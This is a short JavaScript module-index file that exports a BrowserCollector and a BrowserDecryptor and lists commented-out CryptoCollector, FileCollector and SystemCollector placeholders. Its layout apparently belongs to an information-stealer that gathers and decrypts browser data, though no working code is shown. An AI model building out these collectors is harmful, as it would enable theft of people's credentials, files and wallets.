/**
 * Modules Exports
 * Centralized exports for all application modules
 */

const { BrowserCollector } = require('./browsers/collector');
const { BrowserDecryptor } = require('./browsers/decryptor');

module.exports = {
    // Browser Module
    BrowserCollector,
    BrowserDecryptor,
    
    // Placeholder for future modules
    // CryptoCollector,
    // FileCollector,
    // SystemCollector
};